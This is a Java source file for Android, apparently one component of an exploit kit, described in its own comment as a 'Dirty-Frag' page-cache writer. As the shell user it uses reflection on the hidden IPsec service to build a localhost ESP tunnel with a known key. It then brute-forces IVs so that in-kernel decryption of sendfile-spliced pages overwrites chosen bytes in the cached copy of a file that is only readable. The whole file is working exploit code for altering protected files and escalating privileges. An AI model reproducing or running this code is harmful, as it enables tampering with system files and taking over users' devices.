package q3;

import android.system.Int64Ref;
import android.system.Os;
import android.system.OsConstants;
import java.io.FileDescriptor;
import java.io.RandomAccessFile;
import java.net.InetAddress;
import java.util.Arrays;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import android.os.Binder;
import java.lang.reflect.*;

/**
 * Dirty-Frag chosen-content page-cache writer (uid 2000). Poisons a SHELL-READABLE file's page
 * cache to a desired byte-set, writing ONLY the bytes that differ (diff-optimized). Stages its
 * OWN SA on spi 0xDEADBE11 so it can coexist with the Stager's 0xDEADBE10.
 *
 * Usage: Writer <targetfile> <patchspec>
 *   patchspec = binary list of records: u32 little-endian offset, u8 desired-value  (5 bytes each)
 * Only records whose desired value != current page-cache value are written (1 packet each).
 */
public class Writer {
    static final int MSG_MORE = 0x8000;
    static Object svc;
    static Class<?> C(String n) throws Exception { return Class.forName(n); }
    static Object call(String n, Class<?>[] s, Object... a) throws Exception {
        try { return C("android.net.IIpSecService").getMethod(n, s).invoke(svc, a); }
        catch (InvocationTargetException e) { throw new RuntimeException(n + " -> " + e.getCause()); }
    }
    static int fi(Object o, String f) throws Exception {
        Field x = o.getClass().getDeclaredField(f); x.setAccessible(true); return x.getInt(o);
    }
    static byte[] KEYMAT = new byte[20];
    static Cipher AES;
    static int ks0(byte[] iv) throws Exception {
        byte[] ctr = new byte[16];
        System.arraycopy(KEYMAT, 16, ctr, 0, 4);
        System.arraycopy(iv, 0, ctr, 4, 8);
        ctr[15] = 2;
        return AES.doFinal(ctr)[0] & 0xff;
    }

    public static void main(String[] argv) {
        try { run(argv); } catch (Throwable t) { System.out.println("[!] " + t); t.printStackTrace(System.out); }
    }

    static void run(String[] argv) throws Exception {
        String path = argv[0];
        byte[] spec = java.nio.file.Files.readAllBytes(new java.io.File(argv[1]).toPath());
        int nrec = spec.length / 5;

        for (int i = 0; i < 20; i++) KEYMAT[i] = (byte) (0x41 + i);
        AES = Cipher.getInstance("AES/ECB/NoPadding");
        AES.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(Arrays.copyOfRange(KEYMAT, 0, 16), "AES"));

        Object b = C("android.os.ServiceManager").getMethod("getService", String.class).invoke(null, "ipsec");
        svc = C("android.net.IIpSecService$Stub").getMethod("asInterface", C("android.os.IBinder")).invoke(null, b);
        Class<?> IB = C("android.os.IBinder");
        Object tok = new Binder();
        Object enc = call("openUdpEncapsulationSocket", new Class<?>[]{int.class, IB}, 0, tok);
        int encRid = fi(enc, "resourceId"), port = fi(enc, "port");
        int WSPI = 0xDEAD0000 | (new java.util.Random().nextInt(0x10000));   // random -> no stale-SA collision on retry
        Object spiR = call("allocateSecurityParameterIndex", new Class<?>[]{String.class, int.class, IB},
                "127.0.0.1", WSPI, tok);
        int spiRid = fi(spiR, "resourceId"), spi = fi(spiR, "spi");
        Object alg = C("android.net.IpSecAlgorithm").getConstructor(String.class, byte[].class, int.class)
                .newInstance("rfc4106(gcm(aes))", KEYMAT, 128);
        Class<?> cfgC = C("android.net.IpSecConfig");
        Object cfg = cfgC.getDeclaredConstructor().newInstance();
        cfgC.getMethod("setMode", int.class).invoke(cfg, 0);
        cfgC.getMethod("setSourceAddress", String.class).invoke(cfg, "127.0.0.1");
        cfgC.getMethod("setDestinationAddress", String.class).invoke(cfg, "127.0.0.1");
        cfgC.getMethod("setSpiResourceId", int.class).invoke(cfg, spiRid);
        cfgC.getMethod("setEncapType", int.class).invoke(cfg, 2);
        cfgC.getMethod("setEncapSocketResourceId", int.class).invoke(cfg, encRid);
        cfgC.getMethod("setEncapRemotePort", int.class).invoke(cfg, port);
        cfgC.getMethod("setAuthenticatedEncryption", C("android.net.IpSecAlgorithm")).invoke(cfg, alg);
        Object tr = call("createTransform", new Class<?>[]{cfgC, IB, String.class}, cfg, tok, "com.android.shell");
        System.out.println("[*] writer SA status=" + fi(tr, "status") + " spi=0x" + Integer.toHexString(spi)
                + " port=" + port + " recs=" + nrec);

        FileDescriptor sk = Os.socket(OsConstants.AF_INET, OsConstants.SOCK_DGRAM, 0);
        Os.connect(sk, InetAddress.getByName("127.0.0.1"), port);
        FileDescriptor f = Os.open(path, OsConstants.O_RDONLY, 0);

        int wrote = 0, skipped = 0;
        java.util.Random rnd = new java.util.Random(0x51C1L);
        RandomAccessFile r = new RandomAccessFile(path, "r");
        for (int k = 0; k < nrec; k++) {
            long o = (spec[k*5] & 0xffL) | ((spec[k*5+1] & 0xffL)<<8)
                   | ((spec[k*5+2] & 0xffL)<<16) | ((spec[k*5+3] & 0xffL)<<24);
            int want = spec[k*5+4] & 0xff;
            r.seek(o); int cur = r.read();
            if (cur == want) { skipped++; continue; }
            int need = (cur ^ want) & 0xff;
            byte[] iv = new byte[8];
            int n = 0;
            while (true) { rnd.nextBytes(iv); n++; if (ks0(iv) == need) break;
                           if (n > 2000000) throw new RuntimeException("no IV @"+o); }
            byte[] hdr = new byte[16];
            hdr[0]=(byte)(spi>>>24); hdr[1]=(byte)(spi>>>16); hdr[2]=(byte)(spi>>>8); hdr[3]=(byte)spi;
            hdr[7]=1; System.arraycopy(iv,0,hdr,8,8);
            Os.sendto(sk, hdr, 0, 16, MSG_MORE, null, 0);
            Os.sendfile(sk, f, new Int64Ref(o), 17);
            Os.sendto(sk, new byte[0], 0, 0, 0, null, 0);
            Thread.sleep(3);
            wrote++;
        }
        r.close();
        System.out.println("[+] wrote=" + wrote + " skipped=" + skipped);
    }
}
